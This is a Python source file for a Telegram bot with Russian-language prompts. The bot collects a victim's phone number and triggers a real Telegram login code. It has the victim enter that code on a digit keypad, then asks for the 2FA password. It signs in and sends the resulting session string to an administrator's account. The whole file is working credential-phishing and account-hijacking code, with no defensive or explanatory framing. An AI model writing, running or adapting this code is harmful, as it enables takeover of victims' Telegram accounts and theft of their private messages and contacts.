import os
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telethon import TelegramClient
from telethon.sessions import StringSession

API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))

user_states = {}

def code_keyboard(current_code=""):
    digits = [
        [InlineKeyboardButton(str(i), callback_data=f"digit:{i}") for i in range(1, 4)],
        [InlineKeyboardButton(str(i), callback_data=f"digit:{i}") for i in range(4, 7)],
        [InlineKeyboardButton(str(i), callback_data=f"digit:{i}") for i in range(7, 10)],
        [InlineKeyboardButton("0", callback_data="digit:0"),
         InlineKeyboardButton("←", callback_data="delete"),
         InlineKeyboardButton("✅ Готово", callback_data="done")]
    ]
    return InlineKeyboardMarkup(digits)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📲 Отправь номер телефона в формате +998xx...")

async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    user_id = update.effective_user.id

    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        await client.send_code_request(phone)

        user_states[user_id] = {
            "client": client,
            "phone": phone,
            "code": "",
            "awaiting_password": False
        }

        await update.message.reply_text(
            f"📩 Код отправлен на {phone}.\nНажимай кнопки ниже для ввода:",
            reply_markup=code_keyboard()
        )

    except Exception as e:
        await update.message.reply_text(f"❌ Ошибка: {e}")

async def handle_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer()

    if user_id not in user_states:
        await query.edit_message_text("⛔ Сессия устарела. Напиши /start")
        return

    data = user_states[user_id]
    if "code" not in data:
        data["code"] = ""

    if query.data.startswith("digit:"):
        digit = query.data.split(":")[1]
        data["code"] += digit
    elif query.data == "delete":
        data["code"] = data["code"][:-1]
    elif query.data == "done":
        await try_code(update, context, user_id)
        return

    await query.edit_message_text(
        f"🔢 Введённый код: `{data['code']}`",
        parse_mode="Markdown",
        reply_markup=code_keyboard()
    )

async def try_code(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int):
    data = user_states[user_id]
    client = data["client"]
    code = data["code"]

    try:
        await client.sign_in(phone=data["phone"], code=code)
        session_str = client.session.save()

        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"✅ Сессия получена:\n\n`{session_str}`",
            parse_mode="Markdown"
        )
        await context.bot.send_message(chat_id=user_id, text="✅ Успешно! Сессия отправлена администратору.")
        await client.disconnect()
        del user_states[user_id]

    except Exception as e:
        if "SESSION_PASSWORD_NEEDED" in str(e):
            await context.bot.send_message(chat_id=user_id, text="🔒 Аккаунт защищён 2FA. Введи пароль:")
            data["awaiting_password"] = True
        else:
            await context.bot.send_message(chat_id=user_id, text=f"❌ Ошибка: {e}")

async def handle_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    password = update.message.text.strip()

    if user_id not in user_states or not user_states[user_id]["awaiting_password"]:
        return

    data = user_states[user_id]
    client = data["client"]

    try:
        await client.sign_in(password=password)
        session_str = client.session.save()

        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"✅ Сессия с паролем:\n\n`{session_str}`",
            parse_mode="Markdown"
        )
        await context.bot.send_message(chat_id=user_id, text="✅ Готово! Сессия отправлена.")
        await client.disconnect()
        del user_states[user_id]

    except Exception as e:
        await update.message.reply_text(f"❌ Ошибка входа: {e}")

async def main():
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_button))
    app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r"^\+?\d{7,15}$"), handle_phone))
    app.add_handler(MessageHandler(filters.TEXT & filters.ChatType.PRIVATE, handle_password))

    await app.run_polling()

if __name__ == "__main__":
    asyncio.run(main())
